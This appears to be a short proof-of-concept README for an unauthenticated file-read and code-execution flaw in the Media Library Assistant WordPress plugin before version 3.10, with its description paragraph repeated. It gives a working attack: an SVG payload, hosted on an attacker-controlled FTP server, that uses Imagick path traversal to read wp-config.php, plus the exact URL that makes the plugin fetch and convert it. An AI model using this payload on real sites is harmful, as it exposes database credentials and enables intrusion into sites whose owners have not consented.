# Media-Library-Assistant
Media Library Assistant Wordpress Plugin - RCE and LFI
Description:
# Media Library Assistant Wordpress Plugin in version < 3.10 is affected by an unauthenticated remote reference to Imagick() conversion which allows attacker to perform LFI and RCE depending on the Imagick configuration on the remote server. The affected page is: wp-content/plugins/media-library-assistant/includes/mla-stream-image.php

Description:
# Media Library Assistant Wordpress Plugin in version < 3.10 is affected by an unauthenticated remote reference to Imagick() conversion which allows attacker to perform LFI and RCE depending on the Imagick configuration on the remote server. The affected page is: wp-content/plugins/media-library-assistant/includes/mla-stream-image.php


#LFI

Steps to trigger conversion of a remote SVG

Create a remote FTP server at ftp://X.X.X.X:21 (http will not work, see references)

Host 2 files :
- malicious.svg
- malicious.svg[1]


Payload:
For LFI, getting wp-config.php:

Both malicious.svg and malicious.svg[1] on the remote FTP:

<svg width="500" height="500"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href= "text:../../../../wp-config.php" width="500" height="500" />
</svg>

Then trigger conversion with:
http://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:21/malicious.svg&mla_debug=log&mla_stream_frame=1



